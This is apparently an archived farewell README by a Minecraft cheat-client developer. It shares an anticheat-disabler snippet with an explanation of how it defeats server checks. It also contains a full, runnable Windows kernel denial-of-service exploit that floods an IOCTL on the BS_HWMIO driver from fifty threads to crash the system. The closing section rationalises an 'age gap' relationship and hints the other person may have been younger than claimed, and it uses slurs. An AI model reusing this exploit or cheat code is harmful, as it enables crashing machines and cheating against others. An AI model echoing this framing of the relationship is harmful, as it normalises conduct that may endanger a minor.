# Everything There Was
As a short disclaimer, I'll talk to people that I actually like. I counted a lot of people as "friends," but if you don't see me adding you on a new alias on Discord, then you were just the average "friend" or I don't trust you enough. Explanations for the incident are at the bottom of this repository, but for now, I want to share with you guys the projects that I sincerely loved the most w/ code snippets.

## SRT
<br>
SRT, what was going to be a community flag-ship multi-server cheat, is now dead. I will obviously work on it, but never will you see a client I develop ever reach the internet again. As much as I say I hated everything I made, truth is, I loved all of it. That god forsaken community just makes me want to hate it, which was the answer I gave to most people. I want to give you, the Minecraft client-development community, some tips as to how things worked. Reminder that I don't know how to format text on GitHub, so bare with me here:

```cpp
// AntiGamingChair Ascension check disabler
case AGC_ASCENSION: {
                if (e.getPacket() instanceof C00PacketKeepAlive) {
                    try {
                        Thread.sleep(5000L);
                    } catch (Exception ex) {
                        ex.printStackTrace();
                    }
                }
                break;
            }
```

One of the best things I have ever added to SRT was the disabler above, as funny as-is, this does work. In the times when the first client I ever made, SkyFall, was in development, I was genuinely more eager to learn more than anyone else. The way I went about it was looking at client source codes, and Dort's Meme Client (the good old days) was what I took a glance at. For the Ghostly disabler, I noticed that he used Thread.sleep to sleep the entire packet thread (FYI he does not do this anymore). Ever since I saw that, I kept it in the back of my mind for the literal years to come. In late 2021-ish, I decide to try and make some form of a MinemenClub movement disabler, and I remembered his code for the Ghostly disabler, to eventually evolve into the most simple anticheat disabler to date, with the exclusion of simply cancelling transactions and keep alives. To explain what it actually does, it sleeps the netty thread for five seconds each time the client sends a C00 (which is every second). With this method, you essentially delay the sending and receiving of ALL packets for the time specified in Thread.sleep. The lesson to be learned from this, is to not be afraid of failure, to not be afraid of what others think, to not be afraid of applying what you learned. I may not have applied this particular lesson, but it will only benefit you. Some of you may be glad that it is over, some of you will be disappointed that it is over. Despite the entirety of the Dortware/Corrosion client community wanting to murder me after an incident, I do highly recommend purchasing their client; it is the best multi-server client that will ever actually release.

## Exploit Development
Some of the other projects that I absolutely loved the most were the Windows kernel exploitation ones. Never have I ever had as much fun as I did doing these. The fact that I am able to completely bug check Windows itself and blame a targeted driver was one of the coolest things to me, and still is to some extent today. It was a huge learning curve, as I jumped from barely any knowledge to going straight into kernel-mode exploit development, but hell I do not regret any of it. An example of the most recent denial-of-service exploit is provided below:

```cpp
#pragma warning(disable : 6273)

#include <Windows.h>
#include <stdio.h>

#define TARGET_DEVICE "\\\\.\\BS_HWMIO"
#define TARGET_IOCTL 0x226050

int main(int argc, char** argv);
DWORD WINAPI ioctl_thread(LPVOID lpParam);

DWORD WINAPI ioctl_thread(LPVOID id)
{
	HANDLE driver_handle = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver_handle == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a handle to the \"%s\" driver. Handle Value: 0x%p (%d), Error: 0x%x (%d)", TARGET_DEVICE, driver_handle, driver_handle, TARGET_IOCTL, TARGET_IOCTL);
		return 1;
	}

	printf("\n[*] Thread ID %d launched successfully.", (int)id);

	while (1)
	{
		DeviceIoControl(driver_handle, TARGET_IOCTL, 0, 0, 0, 0, 0, 0);
	}

	return 0;
}

int main(int argc, char** argv)
{
	HANDLE driver_handle = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	char unused = 0;

	printf("[!] Exploit written by uncodable.\n[!] Target Device Driver Symbolic Link: %s\n[!] Target IO Control Code: 0x%x (%d)\n[!] Beginning denial-of-service exploit...", TARGET_DEVICE, TARGET_IOCTL, TARGET_IOCTL);

	if (driver_handle == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a handle to the \"%s\" driver. Handle Value: 0x%p (%d), Error: 0x%x (%d)", TARGET_DEVICE, driver_handle, driver_handle, TARGET_IOCTL, TARGET_IOCTL);
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"%s\" driver. Handle Value: 0x%p (%d)\n[!] Spinning up threads, ready to race!", TARGET_DEVICE, driver_handle, driver_handle);
	
	CloseHandle(driver_handle);

	for (int i = 0; i < 50; i++)
	{
		CreateThread(NULL, 0, ioctl_thread, i, 0, NULL);
	}

	printf("\n[!] It's racing time!");
	unused = getchar();

	return 0;
}
```

... mother of god, is probably what you're thinking. You may be thinking that, but I am looking at what I would have considered an art form. The ability to think outside of the box and actually turn it into something like this always fascinated me, as it always came off as little to no one else could (with that obviously being false). What fascinates me even more is the ability to just take complete control over a program's execution flow, redirecting its flow to execute my own code. This right here, is single-handedly the reason why I LOVE exploit development and exploits in general as much as I do. There are a lot of things that I like to do, the examples being Windows kernel research, exploit development, bug check codes and analyzing crash dumps, debugging (somewhat lmao), writing code, and breaking things in the greatest of ways possible. Putting it all together, gives me the ability to make these. These are all outcomes of pure motivation. With that being said, the lesson to be learned from this is to pursue what you've dreamed to be. If you wanted to make a hacked client, you now have the motivation; all there is left is to put in the work. Trust me, all of you guys will make it there. As a simple, friendly reminder, this was not the only kernel exploitation propject that I ever had. There are way more that I've done throughout my time.

Now, for the very last thing that I will cover, and I do not dare add its own specific title bar for, the actual incident that arised. Just because I am addressing this, does not mean I'm coming back to the community; I want to do it because this was the first thing in mind, besides nuking every account I ever owned. Avri, someone that I used to talk to, is someone that I was actually talking to, because I genuinely felt relaxed talking to her. Eventually, the two of us actually began trusting each other enough to literally share info (which I am not leaking), to solidfy trust even further. I will not be the one to get into the details of the things that I said, but I know what I said. Am I necessarily proud of what I said? You're fucking hilarious if you say "yeah," but understanding the target audience for this explanation, it does not bring an expression of surprise. And to be clear, yeah I aware of the age gap, but I am not even sure if I was lied to anymore. The only two standing, valid reasons why I even continued anyway was because of this thought here: "What age difference sounds better? 20 to 30 or 60 to 70?" I would imagine you picked the latter choice. Now, what if someone were to have carried out a relationship quietly for years to come, then finally made it clear when everything is finally in their acceptable places? People would be surprised, but they would not care. It is only when the information is leaked at its earliest stages, and me consisting of having consistent shit-ass luck, things like this do not surprise me anymore. To not get too off-topic, the other reason is the fact that she was not an asshole at first. I think you (the reader) knew me well enough to know how much I hate assholes, so this was astounding to me as-is. Unfortunately, though, the cliche lesson I learned in English class years ago did not click into memory, the classic that everyone knows: "Don't judge a book by its cover." With all of that now detailed, I would rather stray away from sounding like those generic apology videos scattered about, so I will leave you with this: I am sorry that I am lonely, and decided to go out of my way to try and fix it, like I've wanted to do for the majority of my life.

If you need code snippets of SRT, as now I am genuinely willing to provide some (not all), you may ask Cystemz to forward your message to me. I will be telling him to filter out some retarded messages, so I only get the ones that matter to me the most. I'm sorry, but my time in the community is over, while projects like SRT and Rainstorm will thrive forever after. Alternatively, you may now send a friend request to a specific Discord account and I will accept if I feel like doing so. Discord account: try me#0366 (this is not my new alias).

There is one more message I want to leave for you, and is that I will be privating this repository as well later mid-day tomorrow. I do not want to see repositories on my account anymore, so you can download this at your will and expense. What would I do anyway?

<br><br><br>

<div align="center">
	<h3>Information provided by archive.org.</h3>
	<p>Thanks so much to the guy (or crawler) that archived it!</p>
</div>

<br><br><br>

<img src="https://c.tenor.com/T2lMzW9WdicAAAAC/amogli-edp445.gif">
